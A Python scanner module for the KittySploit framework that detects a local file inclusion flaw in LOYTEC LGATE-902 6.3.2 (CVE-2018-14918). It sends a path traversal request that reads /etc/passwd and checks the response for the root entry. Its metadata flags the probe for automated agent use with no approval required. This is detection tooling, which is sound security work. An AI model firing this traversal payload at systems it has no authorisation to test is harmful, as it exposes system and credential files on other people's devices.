#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LOYTEC LGATE-902 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LOYTEC LGATE-902 6.3.2 - Local File Inclusion Detection',
        'description': 'LOYTEC LGATE-902 6.3.2 is susceptible to local file inclusion which could allow an attacker to manipulate path references and access files and directories (including critical system files) that are stored outside the root folder of the web application running on the device. This can be used to read and configuration files containing, e.g., usernames and passwords.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'loytec', 'lfi', 'seclists', 'packetstorm', 'lgate', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2019/Apr/12',
            'http://packetstormsecurity.com/files/152453/Loytec-LGATE-902-XSS-Traversal-File-Deletion.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-14918',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/HimmelAward/Goby_POC',
        ],
        'cve': 'CVE-2018-14918',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="LOYTEC LGATE-902 6.3.2 - Local File Inclusion detected",
                path='/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152',
            )
            return True
        return False

